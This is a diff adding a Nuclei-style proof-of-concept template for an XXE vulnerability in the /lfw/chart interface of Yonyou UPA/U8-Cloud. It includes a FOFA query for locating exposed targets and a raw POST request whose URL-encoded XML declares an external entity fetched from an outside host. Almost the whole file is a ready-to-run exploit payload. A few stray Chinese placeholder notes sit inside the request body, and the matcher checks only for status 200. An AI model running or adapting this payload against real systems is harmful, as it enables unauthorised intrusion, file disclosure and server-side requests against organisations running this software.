@@ -1,0 +1,40 @@
+id: poc-suo4w9gaccbot8xm
+info:
+  name: 用友UPA系统chart接口 xxe漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/suo4w9gaccbot8xm'
+  tags: xxe,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: suo4w9gaccbot8xm
+    fofa: app="用友-U8-Cloud"
+http:
+- raw:
+  - 'POST /lfw/chart HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    type=pie&xmlstr=%3C?xml%20version=%271.0%27%20encoding=%27UTF-8%27?%3E%3C!DOCTYPE%20ANY%20[%3C!ENTITY%20xxe%20SYSTEM%20%22http://www.baidu.com%22%3E]%3E%3Cchartdataset%3E%3Cparam%3E%3Ctitle%3E%26xxe;%3C/title%3E%3C/param%3E%3Cchart%3E%3Cname%3EUAP%3C/name%3E%3Ccount%3E1%3C/count%3E%3C/chart%3E%3C/chartdataset%3E
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
